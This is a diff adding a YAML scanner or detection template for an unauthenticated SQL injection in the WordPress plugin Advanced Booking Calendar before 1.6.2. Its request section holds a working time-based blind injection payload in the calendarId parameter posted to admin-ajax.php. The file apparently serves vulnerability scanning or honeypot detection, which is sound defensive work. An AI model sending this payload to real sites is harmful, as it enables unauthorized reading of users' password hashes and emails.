@@ -1,0 +1,31 @@
+id: advanced-booking-calendar-sqli
+info:
+  name: Advanced Booking Calendar < 1.6.2 - SQL Injection
+  author: theamanrawat
+  description: 'The AJAX action abc_booking_getBookingResult, available to both authenticated
+    and Unauthenticated users did not sanitise the calendarId parameter which was
+    then concatenated to a SQL statement, leading an unauthenticated SQL injection
+    issue. This could be used to retrieve information from the database, such as users''
+    hashed password, username and email address.
+
+    '
+  severity: critical
+  remediation: Fixed in version 1.6.2
+  reference:
+  - https://wpscan.com/vulnerability/bac7b590-70de-45b3-bdc2-19f90524ca39
+  - https://wordpress.org/plugins/advanced-booking-calendar/
+  metadata:
+    verified: true
+    max-request: 1
+  tags: sqli,wpscan,wordpress,wp-plugin,wp,advanced-booking-calendar,unauthenticated
+traps:
+- request:
+    method: POST
+    path: /wp-admin/admin-ajax.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: calendarId=1)+AND+(SELECT+2065+FROM+(SELECT(SLEEP(6)))jtGw)+AND+(5440=5440&from=2010-05-05&to=2010-05-09&action=abc_booking_getBookingResult
+  response:
+    status_code: 200
+    headers: {}
+    body: abc-result-header
